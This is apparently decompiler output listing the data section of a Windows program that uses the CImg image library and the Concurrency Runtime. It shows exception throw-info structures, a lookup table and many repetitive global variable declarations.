const _ThrowInfo _TI2_AVinvalid_oversubscribe_operation_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVinvalid_oversubscribe_operation_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVnested_scheduler_missing_detach_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVnested_scheduler_missing_detach_Concurrency__
}; // idb
const _ThrowInfo _TI3_AVscheduler_worker_creation_error_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA3_AVscheduler_worker_creation_error_Concurrency__
}; // idb
const _ThrowInfo _TI3_AVbad_array_new_length_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVbad_array_new_length_std__ }; // idb
const _ThrowInfo _TI2_AVruntime_error_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVruntime_error_std__ }; // idb
const _ThrowInfo _TI2_AVinvalid_operation_Concurrency__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVinvalid_operation_Concurrency__ }; // idb
const _ThrowInfo _TI3_AUCImgArgumentException_cimg_library__ = { 0u, &sub_41C250, NULL, &_CTA3_AUCImgArgumentException_cimg_library__ }; // idb
const _ThrowInfo _TI3_AUCImgInstanceException_cimg_library__ = { 0u, &sub_41C250, NULL, &_CTA3_AUCImgInstanceException_cimg_library__ }; // idb
const _ThrowInfo _TI3_AUCImgIOException_cimg_library__ = { 0u, &sub_41C250, NULL, &_CTA3_AUCImgIOException_cimg_library__ }; // idb
int dword_4F8000 = -1; // weak
uintptr_t __security_cookie = 3141592654u;
int dword_4F8040 = 1; // weak
int (__thiscall *off_4F8050)(_DWORD, _DWORD, _DWORD) = &sub_448CD0; // weak
VARIANTARG pvarg = { { { 10u, 0u, 0u, 0u, { 2147614724i64 } } } }; // idb
DWORD dwSpinCount = 4000u; // idb
int dword_4F8078 = -1; // weak
int dword_4F807C = 1; // weak
void *off_4F8080 = &unk_493F6C; // weak
void *off_4F81A0 = &unk_4F81F4; // weak
void *off_4F81A4 = &unk_500314; // weak
void *off_4F81A8 = &unk_500314; // weak
void *off_4F81D0 = &unk_4F81F8; // weak
void *off_4F81D4 = &unk_500318; // weak
void *Buf2 = &asc_496414; // idb
unsigned __int16 *Locale_pctype_array = &asc_495F10; // idb
_UNKNOWN unk_4F82D8; // weak
int dword_4F83B8 = -2; // weak
char byte_4F88E0[256] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\x03',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
HANDLE hConsoleOutput = (HANDLE)0xFFFFFFFE; // idb
int dword_4F89F0 = 2; // weak
int dword_4F89F4 = -1318387531; // weak
void *Buf = NULL; // idb
size_t MaxCount = 0u; // idb
int dword_4F8A0C = 15; // weak
void *dword_4F8A10 = NULL; // idb
int dword_4F8A20 = 0; // weak
int dword_4F8A24 = 15; // weak
void *dword_4F8A28 = NULL; // idb
int dword_4F8A38 = 0; // weak
int dword_4F8A3C = 15; // weak
void *dword_4F8A40 = NULL; // idb
int dword_4F8A50 = 0; // weak
int dword_4F8A54 = 15; // weak
void *dword_4F8A58 = NULL; // idb
int dword_4F8A68 = 0; // weak
int dword_4F8A6C = 15; // weak
void *dword_4F8A70 = NULL; // idb
int dword_4F8A80 = 0; // weak
int dword_4F8A84 = 15; // weak
void *dword_4F8A88 = NULL; // idb
int dword_4F8A98 = 0; // weak
int dword_4F8A9C = 15; // weak
void *dword_4F8AA0 = NULL; // idb
int dword_4F8AB0 = 0; // weak
int dword_4F8AB4 = 15; // weak
void *dword_4F8AB8 = NULL; // idb
int dword_4F8AC8 = 0; // weak
int dword_4F8ACC = 15; // weak
void *dword_4F8AD0 = NULL; // idb
int dword_4F8AE0 = 0; // weak
int dword_4F8AE4 = 15; // weak
void *dword_4F8AE8 = NULL; // idb
int dword_4F8AF8 = 0; // weak
int dword_4F8AFC = 15; // weak
void *dword_4F8B00 = NULL; // idb
int dword_4F8B10 = 0; // weak
int dword_4F8B14 = 15; // weak
void *dword_4F8B18 = NULL; // idb
int dword_4F8B28 = 0; // weak
int dword_4F8B2C = 15; // weak
void *dword_4F8B30 = NULL; // idb
int dword_4F8B40 = 0; // weak
int dword_4F8B44 = 15; // weak
void *dword_4F8B48 = NULL; // idb
int dword_4F8B58 = 0; // weak
int dword_4F8B5C = 15; // weak
void *dword_4F8B60 = NULL; // idb
int dword_4F8B70 = 0; // weak
int dword_4F8B74 = 15; // weak
void *dword_4F8B78 = NULL; // idb
int dword_4F8B88 = 0; // weak
int dword_4F8B8C = 15; // weak
void *dword_4F8B90 = NULL; // idb
int dword_4F8BA0 = 0; // weak
int dword_4F8BA4 = 15; // weak
void *dword_4F8BA8 = NULL; // idb
int dword_4F8BB8 = 0; // weak
int dword_4F8BBC = 15; // weak
void *dword_4F8BC0 = NULL; // idb
int dword_4F8BD0 = 0; // weak
int dword_4F8BD4 = 15; // weak
void *dword_4F8BD8 = NULL; // idb
int dword_4F8BE8 = 0; // weak
int dword_4F8BEC = 15; // weak
void *dword_4F8BF0 = NULL; // idb
int dword_4F8C00 = 0; // weak
int dword_4F8C04 = 15; // weak
void *dword_4F8C08 = NULL; // idb
int dword_4F8C18 = 0; // weak
int dword_4F8C1C = 15; // weak
void *dword_4F8C20 = NULL; // idb
int dword_4F8C30 = 0; // weak
int dword_4F8C34 = 15; // weak
void *dword_4F8C38 = NULL; // idb
int dword_4F8C48 = 0; // weak
int dword_4F8C4C = 15; // weak
void *dword_4F8C50 = NULL; // idb
int dword_4F8C60 = 0; // weak
int dword_4F8C64 = 15; // weak
void *dword_4F8C68 = NULL; // idb
int dword_4F8C78 = 0; // weak
int dword_4F8C7C = 15; // weak
void *dword_4F8C80 = NULL; // idb
int dword_4F8C90 = 0; // weak
int dword_4F8C94 = 15; // weak
void *dword_4F8C98 = NULL; // idb
int dword_4F8CA8 = 0; // weak
int dword_4F8CAC = 15; // weak
void *dword_4F8CB0 = NULL; // idb
int dword_4F8CC0 = 0; // weak
int dword_4F8CC4 = 15; // weak
void *dword_4F8CC8 = NULL; // idb
int dword_4F8CD8 = 0; // weak
int dword_4F8CDC = 15; // weak
void *dword_4F8CE0 = NULL; // idb
int dword_4F8CF0 = 0; // weak
int dword_4F8CF4 = 15; // weak
void *dword_4F8CF8 = NULL; // idb
int dword_4F8D08 = 0; // weak
int dword_4F8D0C = 15; // weak
void *dword_4F8D10 = NULL; // idb
int dword_4F8D20 = 0; // weak
int dword_4F8D24 = 15; // weak
void *dword_4F8D28 = NULL; // idb
int dword_4F8D38 = 0; // weak
int dword_4F8D3C = 15; // weak
void *dword_4F8D40 = NULL; // idb
int dword_4F8D50 = 0; // weak
int dword_4F8D54 = 15; // weak
void *dword_4F8D58 = NULL; // idb
int dword_4F8D68 = 0; // weak
int dword_4F8D6C = 15; // weak
void *dword_4F8D70 = NULL; // idb
int dword_4F8D80 = 0; // weak
int dword_4F8D84 = 15; // weak
void *dword_4F8D88 = NULL; // idb
int dword_4F8D98 = 0; // weak
int dword_4F8D9C = 15; // weak
void *dword_4F8DA0 = NULL; // idb
int dword_4F8DB0 = 0; // weak
int dword_4F8DB4 = 15; // weak
void *dword_4F8DB8 = NULL; // idb
int dword_4F8DC8 = 0; // weak
int dword_4F8DCC = 15; // weak
void *dword_4F8DD0 = NULL; // idb
int dword_4F8DE0 = 0; // weak
int dword_4F8DE4 = 15; // weak
void *dword_4F8DE8 = NULL; // idb
int dword_4F8DF8 = 0; // weak
int dword_4F8DFC = 15; // weak
void *dword_4F8E00 = NULL; // idb
int dword_4F8E10 = 0; // weak
int dword_4F8E14 = 15; // weak
void *dword_4F8E18 = NULL; // idb
int dword_4F8E28 = 0; // weak
int dword_4F8E2C = 15; // weak
void *dword_4F8E30 = NULL; // idb
int dword_4F8E40 = 0; // weak
int dword_4F8E44 = 15; // weak
void *dword_4F8E48 = NULL; // idb
int dword_4F8E58 = 0; // weak
int dword_4F8E5C = 15; // weak
void *dword_4F8E60 = NULL; // idb
int dword_4F8E70 = 0; // weak
int dword_4F8E74 = 15; // weak
void *dword_4F8E78 = NULL; // idb
int dword_4F8E88 = 0; // weak
int dword_4F8E8C = 15; // weak
void *dword_4F8E90 = NULL; // idb
int dword_4F8EA0 = 0; // weak
int dword_4F8EA4 = 15; // weak
void *dword_4F8EA8 = NULL; // idb
int dword_4F8EB8 = 0; // weak
int dword_4F8EBC = 15; // weak
void *dword_4F8EC0 = NULL; // idb
int dword_4F8ED0 = 0; // weak
int dword_4F8ED4 = 15; // weak
void *dword_4F8ED8 = NULL; // idb
int dword_4F8EE8 = 0; // weak
int dword_4F8EEC = 15; // weak
void *dword_4F8EF0 = NULL; // idb
int dword_4F8F00 = 0; // weak
int dword_4F8F04 = 15; // weak
void *dword_4F8F08 = NULL; // idb
int dword_4F8F18 = 0; // weak
int dword_4F8F1C = 15; // weak
void *dword_4F8F20 = NULL; // idb
int dword_4F8F30 = 0; // weak
int dword_4F8F34 = 15; // weak
void *dword_4F8F38 = NULL; // idb
int dword_4F8F48 = 0; // weak
int dword_4F8F4C = 15; // weak
void *dword_4F8F50 = NULL; // idb
int dword_4F8F60 = 0; // weak
int dword_4F8F64 = 15; // weak
void *dword_4F8F68 = NULL; // idb
int dword_4F8F78 = 0; // weak
int dword_4F8F7C = 15; // weak
void *dword_4F8F80 = NULL; // idb
int dword_4F8F90 = 0; // weak
int dword_4F8F94 = 15; // weak
void *dword_4F8F98 = NULL; // idb
int dword_4F8FA8 = 0; // weak
int dword_4F8FAC = 15; // weak
void *dword_4F8FB0 = NULL; // idb
int dword_4F8FC0 = 0; // weak
int dword_4F8FC4 = 15; // weak
void *dword_4F8FC8 = NULL; // idb
int dword_4F8FD8 = 0; // weak
int dword_4F8FDC = 15; // weak
void *dword_4F8FE0 = NULL; // idb
int dword_4F8FF0 = 0; // weak
int dword_4F8FF4 = 15; // weak
void *dword_4F8FF8 = NULL; // idb
int dword_4F9008 = 0; // weak
int dword_4F900C = 15; // weak
void *dword_4F9010 = NULL; // idb
int dword_4F9020 = 0; // weak
int dword_4F9024 = 15; // weak
void *dword_4F9028 = NULL; // idb
int dword_4F9038 = 0; // weak
int dword_4F903C = 15; // weak
void *dword_4F9040 = NULL; // idb
int dword_4F9050 = 0; // weak
int dword_4F9054 = 15; // weak
void *dword_4F9058 = NULL; // idb
int dword_4F9068 = 0; // weak
int dword_4F906C = 15; // weak
void *dword_4F9070 = NULL; // idb
int dword_4F9080 = 0; // weak
int dword_4F9084 = 15; // weak
void *dword_4F9088 = NULL; // idb
int dword_4F9098 = 0; // weak
int dword_4F909C = 15; // weak
void *dword_4F90A0 = NULL; // idb
int dword_4F90B0 = 0; // weak
int dword_4F90B4 = 15; // weak
void *dword_4F90B8 = NULL; // idb
int dword_4F90C8 = 0; // weak
int dword_4F90CC = 15; // weak
void *dword_4F90D0 = NULL; // idb
int dword_4F90E0 = 0; // weak
int dword_4F90E4 = 15; // weak
void *dword_4F90E8 = NULL; // idb
int dword_4F90F8 = 0; // weak
int dword_4F90FC = 15; // weak
void *dword_4F9100 = NULL; // idb
int dword_4F9110 = 0; // weak
int dword_4F9114 = 15; // weak
void *dword_4F9118 = NULL; // idb
int dword_4F9128 = 0; // weak
int dword_4F912C = 15; // weak
void *dword_4F9130 = NULL; // idb
int dword_4F9140 = 0; // weak
int dword_4F9144 = 15; // weak
void *dword_4F9148 = NULL; // idb
int dword_4F9158 = 0; // weak
int dword_4F915C = 15; // weak
void *dword_4F9160 = NULL; // idb
int dword_4F9170 = 0; // weak
int dword_4F9174 = 15; // weak
void *dword_4F9178 = NULL; // idb
int dword_4F9188 = 0; // weak
int dword_4F918C = 15; // weak
void *dword_4F9190 = NULL; // idb
int dword_4F91A0 = 0; // weak
int dword_4F91A4 = 15; // weak
void *dword_4F91A8 = NULL; // idb
int dword_4F91B8 = 0; // weak
int dword_4F91BC = 15; // weak
void *dword_4F91C0 = NULL; // idb
int dword_4F91D0 = 0; // weak
int dword_4F91D4 = 15; // weak
void *dword_4F91D8 = NULL; // idb
int dword_4F91E8 = 0; // weak
int dword_4F91EC = 15; // weak
void *dword_4F91F0 = NULL; // idb
int dword_4F9200 = 0; // weak
int dword_4F9204 = 15; // weak
void *dword_4F9208 = NULL; // idb
int dword_4F9218 = 0; // weak
int dword_4F921C = 15; // weak
void *dword_4F9220 = NULL; // idb
int dword_4F9230 = 0; // weak
int dword_4F9234 = 15; // weak
void *dword_4F9238 = NULL; // idb
int dword_4F9248 = 0; // weak
int dword_4F924C = 15; // weak
void *dword_4F9250 = NULL; // idb
int dword_4F9260 = 0; // weak
int dword_4F9264 = 15; // weak
void *dword_4F9268 = NULL; // idb
int dword_4F9278 = 0; // weak
int dword_4F927C = 15; // weak
void *dword_4F9280 = NULL; // idb
int dword_4F9290 = 0; // weak
int dword_4F9294 = 15; // weak
void *dword_4F9298 = NULL; // idb
int dword_4F92A8 = 0; // weak
int dword_4F92AC = 15; // weak
void *dword_4F92B0 = NULL; // idb
int dword_4F92C0 = 0; // weak
int dword_4F92C4 = 15; // weak
void *dword_4F92C8 = NULL; // idb
int dword_4F92D8 = 0; // weak
int dword_4F92DC = 15; // weak
void *dword_4F92E0 = NULL; // idb
int dword_4F92F0 = 0; // weak
int dword_4F92F4 = 15; // weak
void *dword_4F92F8 = NULL; // idb
int dword_4F9308 = 0; // weak
int dword_4F930C = 15; // weak
void *dword_4F9310 = NULL; // idb
int dword_4F9320 = 0; // weak
int dword_4F9324 = 15; // weak
void *dword_4F9328 = NULL; // idb
int dword_4F9338 = 0; // weak
int dword_4F933C = 15; // weak
void *dword_4F9340 = NULL; // idb
int dword_4F9350 = 0; // weak
int dword_4F9354 = 15; // weak
void *dword_4F9358 = NULL; // idb
int dword_4F9368 = 0; // weak
int dword_4F936C = 15; // weak
void *dword_4F9370 = NULL; // idb
int dword_4F9380 = 0; // weak
int dword_4F9384 = 15; // weak
void *dword_4F9388 = NULL; // idb
int dword_4F9398 = 0; // weak
int dword_4F939C = 15; // weak
void *dword_4F93A0 = NULL; // idb
int dword_4F93B0 = 0; // weak
int dword_4F93B4 = 15; // weak
void *dword_4F93B8 = NULL; // idb
int dword_4F93C8 = 0; // weak
int dword_4F93CC = 15; // weak
void *dword_4F93D0 = NULL; // idb
int dword_4F93E0 = 0; // weak
int dword_4F93E4 = 15; // weak
void *dword_4F93E8 = NULL; // idb
int dword_4F93F8 = 0; // weak
int dword_4F93FC = 15; // weak
void *dword_4F9400 = NULL; // idb
int dword_4F9410 = 0; // weak
int dword_4F9414 = 15; // weak
void *dword_4F9418 = NULL; // idb
int dword_4F9428 = 0; // weak
int dword_4F942C = 15; // weak
void *dword_4F9430 = NULL; // idb
int dword_4F9440 = 0; // weak
int dword_4F9444 = 15; // weak
void *dword_4F9448 = NULL; // idb
int dword_4F9458 = 0; // weak
int dword_4F945C = 15; // weak
void *dword_4F9460 = NULL; // idb
int dword_4F9470 = 0; // weak
int dword_4F9474 = 15; // weak
void *dword_4F9478 = NULL; // idb
int dword_4F9488 = 0; // weak
int dword_4F948C = 15; // weak
void *dword_4F9490 = NULL; // idb
int dword_4F94A0 = 0; // weak
int dword_4F94A4 = 15; // weak
void *dword_4F94A8 = NULL; // idb
int dword_4F94B8 = 0; // weak
int dword_4F94BC = 15; // weak
void *dword_4F94C0 = NULL; // idb
int dword_4F94D0 = 0; // weak
int dword_4F94D4 = 15; // weak
void *dword_4F94D8 = NULL; // idb
int dword_4F94E8 = 0; // weak
int dword_4F94EC = 15; // weak
void *dword_4F94F0 = NULL; // idb
int dword_4F9500 = 0; // weak
int dword_4F9504 = 15; // weak
void *dword_4F9508 = NULL; // idb
int dword_4F9518 = 0; // weak
int dword_4F951C = 15; // weak
void *dword_4F9520 = NULL; // idb
int dword_4F9530 = 0; // weak
int dword_4F9534 = 15; // weak
void *dword_4F9538 = NULL; // idb
int dword_4F9548 = 0; // weak
int dword_4F954C = 15; // weak
void *dword_4F9550 = NULL; // idb
int dword_4F9560 = 0; // weak
int dword_4F9564 = 15; // weak
void *dword_4F9568 = NULL; // idb
int dword_4F9578 = 0; // weak
int dword_4F957C = 15; // weak
void *dword_4F9580 = NULL; // idb
int dword_4F9590 = 0; // weak
int dword_4F9594 = 15; // weak
void *dword_4F9598 = NULL; // idb
int dword_4F95A8 = 0; // weak
int dword_4F95AC = 15; // weak
void *dword_4F95B0 = NULL; // idb
int dword_4F95C0 = 0; // weak
int dword_4F95C4 = 15; // weak
void *dword_4F95C8 = NULL; // idb
int dword_4F95D8 = 0; // weak
int dword_4F95DC = 15; // weak
void *dword_4F95E0 = NULL; // idb
int dword_4F95F0 = 0; // weak
int dword_4F95F4 = 15; // weak
void *dword_4F95F8 = NULL; // idb
int dword_4F9608 = 0; // weak
int dword_4F960C = 15; // weak
void *dword_4F9610 = NULL; // idb
int dword_4F9620 = 0; // weak
int dword_4F9624 = 15; // weak
void *dword_4F9628 = NULL; // idb
int dword_4F9638 = 0; // weak
int dword_4F963C = 15; // weak
void *dword_4F9640 = NULL; // idb
int dword_4F9650 = 0; // weak
int dword_4F9654 = 15; // weak
void *dword_4F9658 = NULL; // idb
int dword_4F9668 = 0; // weak
int dword_4F966C = 15; // weak
void *dword_4F9670 = NULL; // idb
int dword_4F9680 = 0; // weak
int dword_4F9684 = 15; // weak
void *dword_4F9688 = NULL; // idb
int dword_4F9698 = 0; // weak
int dword_4F969C = 15; // weak
void *dword_4F96A0 = NULL; // idb
int dword_4F96B0 = 0; // weak
int dword_4F96B4 = 15; // weak
void *dword_4F96B8 = NULL; // idb
int dword_4F96C8 = 0; // weak
int dword_4F96CC = 15; // weak
void *dword_4F96D0 = NULL; // idb
int dword_4F96E0 = 0; // weak
int dword_4F96E4 = 15; // weak
void *dword_4F96E8 = NULL; // idb
int dword_4F96F8 = 0; // weak
int dword_4F96FC = 15; // weak
void *dword_4F9700 = NULL; // idb
int dword_4F9710 = 0; // weak
int dword_4F9714 = 15; // weak
void *dword_4F9718 = NULL; // idb
int dword_4F9728 = 0; // weak
int dword_4F972C = 15; // weak
void *dword_4F9730 = NULL; // idb
int dword_4F9740 = 0; // weak
int dword_4F9744 = 15; // weak
void *dword_4F9748 = NULL; // idb
int dword_4F9758 = 0; // weak
int dword_4F975C = 15; // weak
void *dword_4F9760 = NULL; // idb
int dword_4F9770 = 0; // weak
int dword_4F9774 = 15; // weak
void *dword_4F9778 = NULL; // idb
int dword_4F9788 = 0; // weak
int dword_4F978C = 15; // weak
void *dword_4F9790 = NULL; // idb
int dword_4F97A0 = 0; // weak
int dword_4F97A4 = 15; // weak
void *dword_4F97A8 = NULL; // idb
int dword_4F97B8 = 0; // weak
int dword_4F97BC = 15; // weak
void *dword_4F97C0 = NULL; // idb
int dword_4F97D0 = 0; // weak
int dword_4F97D4 = 15; // weak
void *dword_4F97D8 = NULL; // idb
int dword_4F97E8 = 0; // weak
int dword_4F97EC = 15; // weak
void *dword_4F97F0 = NULL; // idb
int dword_4F9800 = 0; // weak
int dword_4F9804 = 15; // weak
void *dword_4F9808 = NULL; // idb
int dword_4F9818 = 0; // weak
int dword_4F981C = 15; // weak
void *dword_4F9820 = NULL; // idb
int dword_4F9830 = 0; // weak
int dword_4F9834 = 15; // weak
void *dword_4F9838 = NULL; // idb
int dword_4F9848 = 0; // weak
int dword_4F984C = 15; // weak
void *dword_4F9850 = NULL; // idb
int dword_4F9860 = 0; // weak
int dword_4F9864 = 15; // weak
void *dword_4F9868 = NULL; // idb
int dword_4F9878 = 0; // weak
int dword_4F987C = 15; // weak
void *dword_4F9880 = NULL; // idb
int dword_4F9890 = 0; // weak
int dword_4F9894 = 15; // weak
void *dword_4F9898 = NULL; // idb
int dword_4F98A8 = 0; // weak
int dword_4F98AC = 15; // weak
void *dword_4F98B0 = NULL; // idb
int dword_4F98C0 = 0; // weak
int dword_4F98C4 = 15; // weak
void *dword_4F98C8 = NULL; // idb
int dword_4F98D8 = 0; // weak
int dword_4F98DC = 15; // weak
void *dword_4F98E0 = NULL; // idb
int dword_4F98F0 = 0; // weak
int dword_4F98F4 = 15; // weak
void *dword_4F98F8 = NULL; // idb
int dword_4F9908 = 0; // weak
int dword_4F990C = 15; // weak
void *dword_4F9910 = NULL; // idb
int dword_4F9920 = 0; // weak
int dword_4F9924 = 15; // weak
void *dword_4F9928 = NULL; // idb
int dword_4F9938 = 0; // weak
int dword_4F993C = 15; // weak
void *dword_4F9940 = NULL; // idb
int dword_4F9950 = 0; // weak
int dword_4F9954 = 15; // weak
void *dword_4F9958 = NULL; // idb
int dword_4F9968 = 0; // weak
int dword_4F996C = 15; // weak
void *dword_4F9970 = NULL; // idb
int dword_4F9980 = 0; // weak
int dword_4F9984 = 15; // weak
void *dword_4F9988 = NULL; // idb
int dword_4F9998 = 0; // weak
int dword_4F999C = 15; // weak
void *dword_4F99A0 = NULL; // idb
int dword_4F99B0 = 0; // weak
int dword_4F99B4 = 15; // weak
void *dword_4F99B8 = NULL; // idb
int dword_4F99C8 = 0; // weak
int dword_4F99CC = 15; // weak
void *dword_4F99D0 = NULL; // idb
int dword_4F99E0 = 0; // weak
int dword_4F99E4 = 15; // weak
void *dword_4F99E8 = NULL; // idb
int dword_4F99F8 = 0; // weak
int dword_4F99FC = 15; // weak
void *dword_4F9A00 = NULL; // idb
int dword_4F9A10 = 0; // weak
int dword_4F9A14 = 15; // weak
void *dword_4F9A18 = NULL; // idb
int dword_4F9A28 = 0; // weak
int dword_4F9A2C = 15; // weak
void *dword_4F9A30 = NULL; // idb
int dword_4F9A40 = 0; // weak
int dword_4F9A44 = 15; // weak
void *dword_4F9A48 = NULL; // idb
int dword_4F9A58 = 0; // weak
int dword_4F9A5C = 15; // weak
void *dword_4F9A60 = NULL; // idb
int dword_4F9A70 = 0; // weak
int dword_4F9A74 = 15; // weak
void *dword_4F9A78 = NULL; // idb
int dword_4F9A88 = 0; // weak
int dword_4F9A8C = 15; // weak
void *dword_4F9A90 = NULL; // idb
int dword_4F9AA0 = 0; // weak
int dword_4F9AA4 = 15; // weak
void *dword_4F9AA8 = NULL; // idb
int dword_4F9AB8 = 0; // weak
int dword_4F9ABC = 15; // weak
void *dword_4F9AC0 = NULL; // idb
int dword_4F9AD0 = 0; // weak
int dword_4F9AD4 = 15; // weak
void *dword_4F9AD8 = NULL; // idb
int dword_4F9AE8 = 0; // weak
int dword_4F9AEC = 15; // weak
void *dword_4F9AF0 = NULL; // idb
int dword_4F9B00 = 0; // weak
int dword_4F9B04 = 15; // weak
void *dword_4F9B08 = NULL; // idb
int dword_4F9B18 = 0; // weak
int dword_4F9B1C = 15; // weak
void *dword_4F9B20 = NULL; // idb
int dword_4F9B30 = 0; // weak
int dword_4F9B34 = 15; // weak
void *dword_4F9B38 = NULL; // idb
int dword_4F9B48 = 0; // weak
int dword_4F9B4C = 15; // weak
void *dword_4F9B50 = NULL; // idb
int dword_4F9B60 = 0; // weak
int dword_4F9B64 = 15; // weak
void *dword_4F9B68 = NULL; // idb
int dword_4F9B78 = 0; // weak
int dword_4F9B7C = 15; // weak
void *dword_4F9B80 = NULL; // idb
int dword_4F9B90 = 0; // weak
int dword_4F9B94 = 15; // weak
void *dword_4F9B98 = NULL; // idb
int dword_4F9BA8 = 0; // weak
int dword_4F9BAC = 15; // weak
void *dword_4F9BB0 = NULL; // idb
int dword_4F9BC0 = 0; // weak
int dword_4F9BC4 = 15; // weak
void *dword_4F9BC8 = NULL; // idb
int dword_4F9BD8 = 0; // weak
int dword_4F9BDC = 15; // weak
void *dword_4F9BE0 = NULL; // idb
int dword_4F9BF0 = 0; // weak
int dword_4F9BF4 = 15; // weak
void *dword_4F9BF8 = NULL; // idb
int dword_4F9C08 = 0; // weak
int dword_4F9C0C = 15; // weak
void *dword_4F9C10 = NULL; // idb
int dword_4F9C20 = 0; // weak
int dword_4F9C24 = 15; // weak
void *dword_4F9C28 = NULL; // idb
int dword_4F9C38 = 0; // weak
int dword_4F9C3C = 15; // weak
void *dword_4F9C40 = NULL; // idb
int dword_4F9C50 = 0; // weak
int dword_4F9C54 = 15; // weak
void *dword_4F9C58 = NULL; // idb
int dword_4F9C68 = 0; // weak
int dword_4F9C6C = 15; // weak
void *dword_4F9C70 = NULL; // idb
int dword_4F9C80 = 0; // weak
int dword_4F9C84 = 15; // weak
void *dword_4F9C88 = NULL; // idb
int dword_4F9C98 = 0; // weak
int dword_4F9C9C = 15; // weak
void *dword_4F9CA0 = NULL; // idb
int dword_4F9CB0 = 0; // weak
int dword_4F9CB4 = 15; // weak
void *dword_4F9CB8 = NULL; // idb
int dword_4F9CC8 = 0; // weak
int dword_4F9CCC = 15; // weak
void *dword_4F9CD0 = NULL; // idb
int dword_4F9CE0 = 0; // weak
int dword_4F9CE4 = 15; // weak
void *dword_4F9CE8 = NULL; // idb
int dword_4F9CF8 = 0; // weak
int dword_4F9CFC = 15; // weak
void *dword_4F9D00 = NULL; // idb
int dword_4F9D10 = 0; // weak
int dword_4F9D14 = 15; // weak
void *dword_4F9D18 = NULL; // idb
int dword_4F9D28 = 0; // weak
int dword_4F9D2C = 15; // weak
void *dword_4F9D30 = NULL; // idb
int dword_4F9D40 = 0; // weak
int dword_4F9D44 = 15; // weak
void *dword_4F9D48 = NULL; // idb
int dword_4F9D58 = 0; // weak
int dword_4F9D5C = 15; // weak
void *dword_4F9D60 = NULL; // idb
int dword_4F9D70 = 0; // weak
int dword_4F9D74 = 15; // weak
void *dword_4F9D78 = NULL; // idb
int dword_4F9D88 = 0; // weak
int dword_4F9D8C = 15; // weak
void *dword_4F9D90 = NULL; // idb
int dword_4F9DA0 = 0; // weak
int dword_4F9DA4 = 15; // weak
void *dword_4F9DA8 = NULL; // idb
int dword_4F9DB8 = 0; // weak
int dword_4F9DBC = 15; // weak
void *dword_4F9DC0 = NULL; // idb
int dword_4F9DD0 = 0; // weak
int dword_4F9DD4 = 15; // weak
void *dword_4F9DD8 = NULL; // idb
int dword_4F9DE8 = 0; // weak
int dword_4F9DEC = 15; // weak
void *dword_4F9DF0 = NULL; // idb
int dword_4F9E00 = 0; // weak
int dword_4F9E04 = 15; // weak
void *dword_4F9E08 = NULL; // idb
int dword_4F9E18 = 0; // weak
int dword_4F9E1C = 15; // weak
void *dword_4F9E20 = NULL; // idb
int dword_4F9E30 = 0; // weak
int dword_4F9E34 = 15; // weak
void *dword_4F9E38 = NULL; // idb
int dword_4F9E48 = 0; // weak
int dword_4F9E4C = 15; // weak
void *dword_4F9E50 = NULL; // idb
int dword_4F9E60 = 0; // weak
int dword_4F9E64 = 15; // weak
void *dword_4F9E68 = NULL; // idb
int dword_4F9E78 = 0; // weak
int dword_4F9E7C = 15; // weak
